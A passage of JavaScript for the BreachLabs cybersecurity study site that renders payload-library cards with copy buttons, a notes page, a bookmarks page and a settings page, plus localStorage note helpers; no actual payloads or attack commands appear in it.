              <p class="small text-muted mb-3">
                <strong>${cat.question}</strong><br>
                ${cat.answer}
              </p>
              <button class="btn btn-sm btn-outline-${cat.color} w-100" type="button" data-bs-toggle="collapse" data-bs-target="#payloads-${index}" aria-expanded="false">
                <i class="fa-solid fa-code"></i> ${txt('عرض الـ Payloads', 'Show Payloads')} (${cat.payloads.length})
              </button>
              <div class="collapse mt-3" id="payloads-${index}">
                <div class="list-group list-group-flush" style="max-height: 400px; overflow-y: auto;">
                  ${cat.payloads.map(payload => `
                    <div class="list-group-item p-2">
                      <div class="d-flex justify-content-between align-items-start">
                        <code class="small flex-grow-1 me-2">${payload}</code>
                        <button class="btn btn-sm btn-outline-primary" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent.trim()); this.innerHTML='<i class=\'fa-solid fa-check\'></i>'; setTimeout(()=>this.innerHTML='<i class=\'fa-solid fa-copy\'></i>',1500)">
                          <i class="fa-solid fa-copy"></i>
                        </button>
                      </div>
                    </div>
                  `).join('')}
                </div>
              </div>
            </div>
          </div>
        </div>
      `).join('')}
    </div>

    ${customPayloads.length > 0 ? `
    <div class="card mt-4">
      <div class="card-header bg-info text-white">
        <h5 class="mb-0"><i class="fa-solid fa-user"></i> ${txt('Payloads المخصصة', 'Custom Payloads')} <span class="badge bg-light text-dark">${customPayloads.length}</span></h5>
      </div>
      <div class="card-body">
        <div class="list-group">
          ${customPayloads.map((payload, index) => `
            <div class="list-group-item d-flex justify-content-between align-items-start">
              <div>
                <h6 class="mb-1">${payload.category}</h6>
                <code class="small">${payload.payload}</code>
                ${payload.description ? `<p class="mb-1 small text-muted">${payload.description}</p>` : ''}
                <small class="text-muted">${new Date(payload.timestamp).toLocaleString()}</small>
              </div>
              <button class="btn btn-sm btn-outline-danger" onclick="deleteCustomPayload(${index})">
                <i class="fa-solid fa-trash"></i>
              </button>
            </div>
          `).join('')}
        </div>
      </div>
    </div>
    ` : ''
    }

  <div class="mt-4 text-center">
    <button class="btn btn-success" onclick="addCustomPayload()">
      <i class="fa-solid fa-plus"></i> ${txt('أضف Payload مخصص', 'Add Custom Payload')}
    </button>
  </div>
  </div >
    `;
}

function copyPayload(btn) {
  const code = btn.previousElementSibling.textContent;
  navigator.clipboard.writeText(code).then(() => {
    const original = btn.innerHTML;
    btn.innerHTML = '<i class="fa-solid fa-check"></i> ' + txt('تم!', 'Done!');
    setTimeout(() => btn.innerHTML = original, 2000);
  });
}


function pageNotes() {
  const savedNotes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');

  return `
    <div class="container-fluid mt-4">
      <style>
        .notes-hero {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          border-radius: 20px;
          padding: 30px;
          color: white;
          margin-bottom: 25px;
          position: relative;
          overflow: hidden;
        }
        .notes-hero::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -50%;
          width: 100%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
        }
        .notes-hero h2 { margin: 0; font-weight: 700; }
        .notes-hero p { margin: 10px 0 0; opacity: 0.9; }
        .notes-stats {
          display: flex;
          gap: 20px;
          margin-top: 20px;
        }
        .notes-stat {
          background: rgba(255,255,255,0.15);
          padding: 12px 20px;
          border-radius: 12px;
          text-align: center;
        }
        .notes-stat-value { font-size: 1.5rem; font-weight: 700; }
        .notes-stat-label { font-size: 0.8rem; opacity: 0.9; }
        .notes-toolbar {
          display: flex;
          gap: 15px;
          margin-bottom: 25px;
          flex-wrap: wrap;
        }
        .notes-search {
          flex: 1;
          min-width: 250px;
          position: relative;
        }
        .notes-search input {
          width: 100%;
          padding: 12px 20px 12px 45px;
          border: 2px solid #e9ecef;
          border-radius: 12px;
          font-size: 1rem;
          transition: all 0.3s;
        }
        .notes-search input:focus {
          outline: none;
          border-color: #667eea;
          box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .notes-search i {
          position: absolute;
          left: 15px;
          top: 50%;
          transform: translateY(-50%);
          color: #999;
        }
        .notes-actions { display: flex; gap: 10px; }
        .notes-actions button {
          padding: 12px 20px;
          border-radius: 12px;
          border: none;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .btn-add-note {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
        }
        .btn-add-note:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4); }
        .note-card {
          background: white;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 15px;
          border: 1px solid #e9ecef;
          transition: all 0.3s;
          position: relative;
        }
        .note-card:hover {
          border-color: #667eea;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
          transform: translateY(-2px);
        }
        .note-card-header {
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
          margin-bottom: 15px;
        }
        .note-title {
          font-weight: 700;
          font-size: 1.1rem;
          color: #333;
          margin: 0;
        }
        .note-category {
          padding: 4px 12px;
          border-radius: 20px;
          font-size: 0.75rem;
          font-weight: 600;
        }
        .category-vulnerability { background: #ffe0e6; color: #e53e6d; }
        .category-tool { background: #e0f4ff; color: #0095ff; }
        .category-technique { background: #e6ffe0; color: #2ecc71; }
        .category-general { background: #fff3e0; color: #f39c12; }
        .note-content {
          color: #666;
          line-height: 1.6;
          margin-bottom: 15px;
          max-height: 100px;
          overflow: hidden;
        }
        .note-footer {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding-top: 15px;
          border-top: 1px solid #f0f0f0;
        }
        .note-date { font-size: 0.8rem; color: #999; }
        .note-actions { display: flex; gap: 8px; }
        .note-actions button {
          padding: 6px 12px;
          border-radius: 8px;
          border: 1px solid #e9ecef;
          background: white;
          cursor: pointer;
          transition: all 0.2s;
          font-size: 0.85rem;
        }
        .note-actions button:hover { background: #667eea; color: white; border-color: #667eea; }
        .note-actions .btn-delete:hover { background: #e74c3c; border-color: #e74c3c; }
        .empty-notes {
          text-align: center;
          padding: 60px 20px;
          color: #999;
        }
        .empty-notes i { font-size: 4rem; margin-bottom: 20px; opacity: 0.3; }
        .empty-notes h3 { color: #666; margin-bottom: 10px; }
        .quick-templates {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
          gap: 15px;
          margin-top: 30px;
        }
        .template-card {
          background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
          border-radius: 12px;
          padding: 20px;
          cursor: pointer;
          transition: all 0.3s;
          text-align: center;
        }
        .template-card:hover {
          transform: translateY(-3px);
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        .template-card i { font-size: 2rem; color: #667eea; margin-bottom: 10px; }
        .template-card h5 { margin: 0 0 5px; font-size: 1rem; }
        .template-card p { margin: 0; font-size: 0.8rem; color: #666; }
      </style>

      <!--Hero Section-- >
      <div class="notes-hero">
        <h2><i class="fa-solid fa-book-bookmark me-2"></i>${txt('مفكرتك الأمنية', 'Your Security Notes')}</h2>
        <p>${txt('دوّن ملاحظاتك، أفكارك، واكتشافاتك في مكان واحد', 'Document your notes, ideas, and discoveries in one place')}</p>
        <div class="notes-stats">
          <div class="notes-stat">
            <div class="notes-stat-value">${savedNotes.length}</div>
            <div class="notes-stat-label">${txt('ملاحظة', 'Notes')}</div>
          </div>
          <div class="notes-stat">
            <div class="notes-stat-value">${savedNotes.filter(n => n.category === 'vulnerability').length}</div>
            <div class="notes-stat-label">${txt('ثغرات', 'Vulnerabilities')}</div>
          </div>
          <div class="notes-stat">
            <div class="notes-stat-value">${savedNotes.filter(n => n.category === 'tool').length}</div>
            <div class="notes-stat-label">${txt('أدوات', 'Tools')}</div>
          </div>
        </div>
      </div>

      <!--Toolbar -->
      <div class="notes-toolbar">
        <div class="notes-search">
          <i class="fa-solid fa-search"></i>
          <input type="text" id="notes-search" placeholder="${txt('ابحث في ملاحظاتك...', 'Search your notes...')}" onkeyup="filterNotes()">
        </div>
        <div class="notes-actions">
          <button class="btn-add-note" onclick="showAddNoteModal()">
            <i class="fa-solid fa-plus"></i> ${txt('ملاحظة جديدة', 'New Note')}
          </button>
          <button class="btn btn-outline-primary" onclick="exportAllNotesAsJSON()">
            <i class="fa-solid fa-download"></i> ${txt('تصدير', 'Export')}
          </button>
        </div>
      </div>

      <!--Notes Grid-- >
    <div id="notes-container">
      ${savedNotes.length === 0 ? `
          <div class="empty-notes">
            <i class="fa-solid fa-sticky-note"></i>
            <h3>${txt('لا توجد ملاحظات بعد', 'No notes yet')}</h3>
            <p>${txt('ابدأ بإنشاء ملاحظتك الأولى أو اختر من القوالب أدناه', 'Start by creating your first note or choose from templates below')}</p>
          </div>
          
          <h4 class="mt-4"><i class="fa-solid fa-wand-magic-sparkles me-2"></i>${txt('قوالب سريعة', 'Quick Templates')}</h4>
          <div class="quick-templates">
            <div class="template-card" onclick="createFromTemplate('vulnerability')">
              <i class="fa-solid fa-bug"></i>
              <h5>${txt('ملاحظة ثغرة', 'Vulnerability Note')}</h5>
              <p>${txt('توثيق ثغرة أمنية', 'Document a security vulnerability')}</p>
            </div>
            <div class="template-card" onclick="createFromTemplate('tool')">
              <i class="fa-solid fa-wrench"></i>
              <h5>${txt('ملاحظة أداة', 'Tool Note')}</h5>
              <p>${txt('تعلم أداة جديدة', 'Learn a new tool')}</p>
            </div>
            <div class="template-card" onclick="createFromTemplate('technique')">
              <i class="fa-solid fa-lightbulb"></i>
              <h5>${txt('تقنية جديدة', 'New Technique')}</h5>
              <p>${txt('توثيق تقنية اختبار', 'Document a testing technique')}</p>
            </div>
            <div class="template-card" onclick="createFromTemplate('ctf')">
              <i class="fa-solid fa-flag"></i>
              <h5>${txt('حل CTF', 'CTF Writeup')}</h5>
              <p>${txt('توثيق حل تحدي', 'Document a challenge solution')}</p>
            </div>
          </div>
        ` : savedNotes.map((note, i) => `
          <div class="note-card" data-index="${i}">
            <div class="note-card-header">
              <h4 class="note-title">${note.title}</h4>
              <span class="note-category category-${note.category || 'general'}">${getCategoryName(note.category)}</span>
            </div>
            <div class="note-content">${note.content.substring(0, 200)}${note.content.length > 200 ? '...' : ''}</div>
            <div class="note-footer">
              <span class="note-date"><i class="fa-regular fa-clock me-1"></i>${new Date(note.timestamp).toLocaleDateString()}</span>
              <div class="note-actions">
                <button onclick="viewNote(${i})"><i class="fa-solid fa-eye"></i></button>
                <button onclick="editNote(${i})"><i class="fa-solid fa-edit"></i></button>
                <button class="btn-delete" onclick="deleteNote(${i})"><i class="fa-solid fa-trash"></i></button>
              </div>
            </div>
          </div>
        `).join('')}
    </div>
    </div >

    < !--Add Note Modal-- >
    <div class="modal fade" id="addNoteModal" tabindex="-1">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
            <h5 class="modal-title"><i class="fa-solid fa-plus me-2"></i>${txt('ملاحظة جديدة', 'New Note')}</h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
          </div>
          <div class="modal-body">
            <div class="mb-3">
              <label class="form-label fw-bold">${txt('العنوان', 'Title')}</label>
              <input type="text" class="form-control" id="new-note-title" placeholder="${txt('عنوان الملاحظة', 'Note title')}">
            </div>
            <div class="mb-3">
              <label class="form-label fw-bold">${txt('التصنيف', 'Category')}</label>
              <select class="form-select" id="new-note-category">
                <option value="general">${txt('عام', 'General')}</option>
                <option value="vulnerability">${txt('ثغرة', 'Vulnerability')}</option>
                <option value="tool">${txt('أداة', 'Tool')}</option>
                <option value="technique">${txt('تقنية', 'Technique')}</option>
              </select>
            </div>
            <div class="mb-3">
              <label class="form-label fw-bold">${txt('المحتوى', 'Content')}</label>
              <textarea class="form-control" id="new-note-content" rows="8" placeholder="${txt('اكتب ملاحظتك هنا...', 'Write your note here...')}"></textarea>
            </div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">${txt('إلغاء', 'Cancel')}</button>
            <button type="button" class="btn btn-primary" onclick="saveNewNote()">${txt('حفظ الملاحظة', 'Save Note')}</button>
          </div>
        </div>
      </div>
    </div>
  `;
}

function pageBookmarks() {
  return `
    <div class="container-fluid mt-4">
      <style>
        .bookmarks-hero {
          background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
          border-radius: 20px;
          padding: 30px;
          color: white;
          margin-bottom: 25px;
          position: relative;
          overflow: hidden;
        }
        .bookmarks-hero::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -50%;
          width: 100%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
        }
        .bookmarks-hero h2 { margin: 0; font-weight: 700; }
        .bookmarks-hero p { margin: 10px 0 0; opacity: 0.9; }
        .bookmarks-count {
          display: inline-flex;
          align-items: center;
          gap: 10px;
          background: rgba(255,255,255,0.2);
          padding: 10px 20px;
          border-radius: 30px;
          margin-top: 15px;
          font-weight: 600;
        }
        .bookmark-card {
          background: white;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #e9ecef;
          transition: all 0.3s;
          height: 100%;
          display: flex;
          flex-direction: column;
        }
        .bookmark-card:hover {
          border-color: #f093fb;
          box-shadow: 0 10px 30px rgba(240, 147, 251, 0.15);
          transform: translateY(-3px);
        }
        .bookmark-icon {
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.3rem;
          color: white;
          margin-bottom: 15px;
        }
        .bookmark-icon.courses { background: linear-gradient(135deg, #667eea, #764ba2); }
        .bookmark-icon.tools { background: linear-gradient(135deg, #11998e, #38ef7d); }
        .bookmark-icon.rooms { background: linear-gradient(135deg, #f093fb, #f5576c); }
        .bookmark-icon.default { background: linear-gradient(135deg, #ffecd2, #fcb69f); color: #333; }
        .bookmark-title {
          font-weight: 700;
          font-size: 1.1rem;
          color: #333;
          margin-bottom: 8px;
        }
        .bookmark-meta {
          font-size: 0.8rem;
          color: #999;
          margin-bottom: 15px;
          flex: 1;
        }
        .bookmark-actions {
          display: flex;
          gap: 10px;
        }
        .bookmark-actions button {
          flex: 1;
          padding: 10px;
          border-radius: 10px;
          border: none;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
        }
        .btn-open {
          background: linear-gradient(135deg, #667eea, #764ba2);
          color: white;
        }
        .btn-open:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3); }
        .btn-remove {
          background: #f8f9fa;
          color: #e74c3c;
          border: 1px solid #e9ecef !important;
        }
        .btn-remove:hover { background: #e74c3c; color: white; }
        .empty-bookmarks {
          text-align: center;
          padding: 60px 20px;
          color: #999;
        }
        .empty-bookmarks i { font-size: 4rem; margin-bottom: 20px; opacity: 0.3; color: #f093fb; }
        .empty-bookmarks h3 { color: #666; margin-bottom: 10px; }
        .suggestions-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
          gap: 15px;
          margin-top: 30px;
        }
        .suggestion-card {
          background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
          border-radius: 12px;
          padding: 20px;
          cursor: pointer;
          transition: all 0.3s;
          text-align: center;
        }
        .suggestion-card:hover {
          transform: translateY(-3px);
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        .suggestion-card i { font-size: 2rem; color: #f093fb; margin-bottom: 10px; }
        .suggestion-card p { margin: 0; font-size: 0.9rem; font-weight: 600; }
        .clear-all-btn {
          background: linear-gradient(135deg, #e74c3c, #c0392b);
          color: white;
          border: none;
          padding: 12px 25px;
          border-radius: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
        }
        .clear-all-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(231, 76, 60, 0.3); }
      </style>

      <!--Hero Section-- >
    <div class="bookmarks-hero">
      <h2><i class="fa-solid fa-bookmark me-2"></i>${txt('مفضلاتك', 'Your Bookmarks')}</h2>
      <p>${txt('الوصول السريع لصفحاتك وأدواتك المفضلة', 'Quick access to your favorite pages and tools')}</p>
      <div class="bookmarks-count">
        <i class="fa-solid fa-star"></i>
        <span>${bookmarks.length} ${txt('عنصر محفوظ', 'saved items')}</span>
      </div>
    </div>

      ${bookmarks.length === 0 ? `
        <div class="empty-bookmarks">
          <i class="fa-solid fa-bookmark"></i>
          <h3>${txt('لا توجد مفضلات بعد', 'No bookmarks yet')}</h3>
          <p>${txt('ابدأ بإضافة صفحاتك المفضلة للوصول السريع', 'Start adding your favorite pages for quick access')}</p>
        </div>
        
        <h4 class="mt-4"><i class="fa-solid fa-compass me-2"></i>${txt('صفحات مقترحة', 'Suggested Pages')}</h4>
        <div class="suggestions-grid">
          <div class="suggestion-card" onclick="loadPage('courses')">
            <i class="fa-solid fa-graduation-cap"></i>
            <p>${txt('الكورسات', 'Courses')}</p>
          </div>
          <div class="suggestion-card" onclick="loadPage('practice')">
            <i class="fa-solid fa-door-open"></i>
            <p>${txt('الغرف', 'Rooms')}</p>
          </div>
          <div class="suggestion-card" onclick="loadPage('toolshub')">
            <i class="fa-solid fa-toolbox"></i>
            <p>${txt('الأدوات', 'Tools')}</p>
          </div>
          <div class="suggestion-card" onclick="loadPage('bugbounty')">
            <i class="fa-solid fa-bug"></i>
            <p>${txt('صيد الثغرات', 'Bug Bounty')}</p>
          </div>
        </div>
      ` : `
        <div class="row g-4">
          ${bookmarks.map((bookmark, index) => `
            <div class="col-md-6 col-lg-4">
              <div class="bookmark-card">
                <div class="bookmark-icon ${getBookmarkIconClass(bookmark.pageId)}">
                  <i class="fa-solid ${getBookmarkIcon(bookmark.pageId)}"></i>
                </div>
                <div class="bookmark-title">${bookmark.sectionName || bookmark.pageId}</div>
                <div class="bookmark-meta">
                  <i class="fa-regular fa-clock me-1"></i>
                  ${txt('تمت الإضافة:', 'Added:')} ${new Date(bookmark.timestamp).toLocaleDateString()}
                </div>
                <div class="bookmark-actions">
                  <button class="btn-open" onclick="loadPage('${bookmark.pageId}')">
                    <i class="fa-solid fa-arrow-right me-1"></i>${txt('فتح', 'Open')}
                  </button>
                  <button class="btn-remove" onclick="removeBookmark(${index})">
                    <i class="fa-solid fa-trash"></i>
                  </button>
                </div>
              </div>
            </div>
          `).join('')}
        </div>
        
        <div class="mt-4 text-center">
          <button class="clear-all-btn" onclick="clearAllBookmarks()">
            <i class="fa-solid fa-trash-can me-2"></i>${txt('حذف جميع المفضلات', 'Clear All Bookmarks')}
          </button>
        </div>
      `}
    </div >
    `;
}

function pageSettingsOld() {
  const lang = currentLang || 'ar';
  const savedNotes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');

  return `
    <div class="container-fluid mt-4">
      <style>
        .settings-hero {
          background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
          border-radius: 20px;
          padding: 30px;
          color: white;
          margin-bottom: 25px;
          position: relative;
          overflow: hidden;
        }
        .settings-hero::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -50%;
          width: 100%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
        }
        .settings-hero h2 { margin: 0; font-weight: 700; }
        .settings-hero p { margin: 10px 0 0; opacity: 0.9; }
        .settings-section {
          background: white;
          border-radius: 16px;
          padding: 25px;
          margin-bottom: 20px;
          border: 1px solid #e9ecef;
        }
        .settings-section-title {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 20px;
          padding-bottom: 15px;
          border-bottom: 1px solid #e9ecef;
        }
        .settings-section-title i {
          width: 40px;
          height: 40px;
          border-radius: 10px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.1rem;
          color: white;
        }
        .settings-section-title h4 { margin: 0; font-weight: 700; }
        .settings-section-title p { margin: 0; font-size: 0.85rem; color: #666; }
        .icon-preferences { background: linear-gradient(135deg, #667eea, #764ba2); }
        .icon-stats { background: linear-gradient(135deg, #11998e, #38ef7d); }
        .icon-data { background: linear-gradient(135deg, #f093fb, #f5576c); }
        .icon-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); }
        .icon-about { background: linear-gradient(135deg, #3498db, #2980b9); }
        .setting-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 15px 0;
          border-bottom: 1px solid #f0f0f0;
        }
        .setting-item:last-child { border-bottom: none; }
        .setting-info h5 { margin: 0 0 5px; font-weight: 600; }
        .setting-info p { margin: 0; font-size: 0.85rem; color: #666; }
        .setting-control select {
          padding: 10px 15px;
          border: 2px solid #e9ecef;
          border-radius: 10px;
          font-size: 0.95rem;
          min-width: 150px;
          cursor: pointer;
        }
        .setting-control select:focus { outline: none; border-color: #667eea; }
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(2, 1fr);
          gap: 15px;
        }
        .stat-card {
          background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
          border-radius: 12px;
          padding: 20px;
          text-align: center;
        }
        .stat-value {
          font-size: 2rem;
          font-weight: 700;
          background: linear-gradient(135deg, #667eea, #764ba2);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        .stat-label { font-size: 0.85rem; color: #666; margin-top: 5px; }
        .action-buttons {
          display: flex;
          gap: 12px;
          margin-top: 20px;
          flex-wrap: wrap;
        }
        .action-btn {
          flex: 1;
          min-width: 150px;
          padding: 12px 20px;
          border-radius: 12px;
          border: none;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }
        .btn-export { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
        .btn-import { background: linear-gradient(135deg, #11998e, #38ef7d); color: white; }
        .btn-export:hover, .btn-import:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,0,0,0.2); }
        .danger-zone {
          background: linear-gradient(135deg, rgba(231, 76, 60, 0.05), rgba(192, 57, 43, 0.05));
          border: 2px solid rgba(231, 76, 60, 0.2);
        }
        .danger-warning {
          background: rgba(231, 76, 60, 0.1);
          border-radius: 10px;
          padding: 15px;
          margin-bottom: 15px;
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .danger-warning i { font-size: 1.5rem; color: #e74c3c; }
        .danger-warning p { margin: 0; color: #c0392b; font-size: 0.9rem; }
        .btn-danger-action {
          background: linear-gradient(135deg, #e74c3c, #c0392b);
          color: white;
          border: none;
          padding: 12px 25px;
          border-radius: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
        }
        .btn-danger-action:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(231, 76, 60, 0.3); }
        .about-info {
          display: flex;
          align-items: center;
          gap: 20px;
          margin-bottom: 20px;
        }
        .about-logo {
          width: 70px;
          height: 70px;
          background: linear-gradient(135deg, #667eea, #764ba2);
          border-radius: 16px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 2rem;
          color: white;
        }
        .about-text h3 { margin: 0 0 5px; }
        .about-text p { margin: 0; color: #666; }
        .features-list {
          display: flex;
          gap: 20px;
          flex-wrap: wrap;
          margin-top: 15px;
        }
        .feature-badge {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px 15px;
          background: #f8f9fa;
          border-radius: 20px;
          font-size: 0.85rem;
        }
        .feature-badge i { color: #667eea; }
      </style>

      <!--Hero Section-- >
      <div class="settings-hero">
        <h2><i class="fa-solid fa-gear me-2"></i>${txt('الإعدادات', 'Settings')}</h2>
        <p>${txt('تخصيص تجربتك في BreachLabs', 'Customize your BreachLabs experience')}</p>
      </div>

      <!--Preferences Section-- >
      <div class="settings-section">
        <div class="settings-section-title">
          <i class="icon-preferences"><i class="fa-solid fa-sliders"></i></i>
          <div>
            <h4>${txt('التفضيلات', 'Preferences')}</h4>
            <p>${txt('إعدادات الواجهة والعرض', 'Interface and display settings')}</p>
          </div>
        </div>
        
        <div class="setting-item">
          <div class="setting-info">
            <h5><i class="fa-solid fa-language me-2"></i>${txt('اللغة', 'Language')}</h5>
            <p>${txt('تغيير لغة الواجهة', 'Change interface language')}</p>
          </div>
          <div class="setting-control">
            <select id="lang-setting" onchange="changeLanguageSetting()">
              <option value="ar" ${lang === 'ar' ? 'selected' : ''}>العربية</option>
              <option value="en" ${lang === 'en' ? 'selected' : ''}>English</option>
            </select>
          </div>
        </div>

        <div class="setting-item">
          <div class="setting-info">
            <h5><i class="fa-solid fa-moon me-2"></i>${txt('السمة', 'Theme')}</h5>
            <p>${txt('تبديل بين الوضع الفاتح والداكن', 'Toggle between light and dark mode')}</p>
          </div>
          <div class="setting-control">
            <button class="btn btn-outline-primary" onclick="document.getElementById('theme-toggle').click()">
              <i class="fa-solid fa-circle-half-stroke me-1"></i>${txt('تبديل', 'Toggle')}
            </button>
          </div>
        </div>
      </div>

      <!--Statistics Section-- >
      <div class="settings-section">
        <div class="settings-section-title">
          <i class="icon-stats"><i class="fa-solid fa-chart-line"></i></i>
          <div>
            <h4>${txt('إحصائيات التعلم', 'Learning Statistics')}</h4>
            <p>${txt('متابعة تقدمك في المنصة', 'Track your progress on the platform')}</p>
          </div>
        </div>
        
        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-value">${studyStats.sessionsCount || 0}</div>
            <div class="stat-label"><i class="fa-solid fa-calendar-check me-1"></i>${txt('جلسة تعلم', 'Sessions')}</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${Math.round((studyStats.totalTime || 0) / 60)}h</div>
            <div class="stat-label"><i class="fa-solid fa-clock me-1"></i>${txt('إجمالي الوقت', 'Total Time')}</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${bookmarks.length}</div>
            <div class="stat-label"><i class="fa-solid fa-bookmark me-1"></i>${txt('مفضلة', 'Bookmarks')}</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${savedNotes.length}</div>
            <div class="stat-label"><i class="fa-solid fa-sticky-note me-1"></i>${txt('ملاحظات', 'Notes')}</div>
          </div>
        </div>

        <div class="action-buttons">
          <button class="action-btn btn-export" onclick="exportProgress()">
            <i class="fa-solid fa-download"></i>${txt('تصدير التقدم', 'Export Progress')}
          </button>
          <button class="action-btn btn-import" onclick="importProgress()">
            <i class="fa-solid fa-upload"></i>${txt('استيراد التقدم', 'Import Progress')}
          </button>
        </div>
      </div>

      <!--Danger Zone-- >
      <div class="settings-section danger-zone">
        <div class="settings-section-title">
          <i class="icon-danger"><i class="fa-solid fa-triangle-exclamation"></i></i>
          <div>
            <h4>${txt('منطقة الخطر', 'Danger Zone')}</h4>
            <p>${txt('إجراءات غير قابلة للتراجع', 'Irreversible actions')}</p>
          </div>
        </div>
        
        <div class="danger-warning">
          <i class="fa-solid fa-exclamation-circle"></i>
          <p><strong>${txt('تحذير:', 'Warning:')}</strong> ${txt('سيتم حذف جميع بيانات التقدم والملاحظات والمفضلات نهائياً', 'All progress data, notes, and bookmarks will be permanently deleted')}</p>
        </div>
        
        <button class="btn-danger-action" onclick="resetAllData()">
          <i class="fa-solid fa-trash-can me-2"></i>${txt('إعادة تعيين جميع البيانات', 'Reset All Data')}
        </button>
      </div>

      <!--About Section-- >
    <div class="settings-section">
      <div class="settings-section-title">
        <i class="icon-about"><i class="fa-solid fa-circle-info"></i></i>
        <div>
          <h4>${txt('حول BreachLabs', 'About BreachLabs')}</h4>
          <p>${txt('معلومات عن المنصة', 'Platform information')}</p>
        </div>
      </div>

      <div class="about-info">
        <div class="about-logo">
          <i class="fa-solid fa-graduation-cap"></i>
        </div>
        <div class="about-text">
          <h3>BreachLabs</h3>
          <p>${txt('منصة تعليمية شاملة لتعلم وممارسة الأمن السيبراني', 'Comprehensive platform for cybersecurity learning and practice')}</p>
        </div>
      </div>

      <div class="features-list">
        <div class="feature-badge">
          <i class="fa-solid fa-code"></i>
          <span>${txt('مفتوح المصدر', 'Open Source')}</span>
        </div>
        <div class="feature-badge">
          <i class="fa-solid fa-user-graduate"></i>
          <span>${txt('تعليمي', 'Educational')}</span>
        </div>
        <div class="feature-badge">
          <i class="fa-solid fa-shield-halved"></i>
          <span>${txt('آمن', 'Secure')}</span>
        </div>
        <div class="feature-badge">
          <i class="fa-solid fa-robot"></i>
          <span>${txt('AI مدمج', 'AI Powered')}</span>
        </div>
      </div>
    </div>
    </div >
    `;
}

/* ========== helpers ========== */
function cmdBox(cmd, note = '') {
  return `
    < div class="cmd-box" >
    <button class="copy" onclick="copyCmd(this)">نسخ</button>
    <code>${cmd}</code>
    ${note ? `<br><small>${note}</small>` : ''}
  </div > `;
}

// ========== Notes Helper Functions ==========
function getCategoryName(category) {
  const names = {
    'vulnerability': txt('ثغرة', 'Vulnerability'),
    'tool': txt('أداة', 'Tool'),
    'technique': txt('تقنية', 'Technique'),
    'general': txt('عام', 'General')
  };
  return names[category] || names['general'];
}

function showAddNoteModal() {
  const modal = new bootstrap.Modal(document.getElementById('addNoteModal'));
  modal.show();
}

function saveNewNote() {
  const title = document.getElementById('new-note-title').value.trim();
  const category = document.getElementById('new-note-category').value;
  const content = document.getElementById('new-note-content').value.trim();

  if (!title || !content) {
    alert(txt('الرجاء ملء جميع الحقول', 'Please fill all fields'));
    return;
  }

  const notes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');
  notes.unshift({ title, category, content, timestamp: Date.now() });
  localStorage.setItem('studyhub_notes', JSON.stringify(notes));

  bootstrap.Modal.getInstance(document.getElementById('addNoteModal')).hide();
  loadPage('notes');
}

function deleteNote(index) {
  if (!confirm(txt('هل تريد حذف هذه الملاحظة؟', 'Delete this note?'))) return;
  const notes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');
  notes.splice(index, 1);
  localStorage.setItem('studyhub_notes', JSON.stringify(notes));
  loadPage('notes');
}

function viewNote(index) {
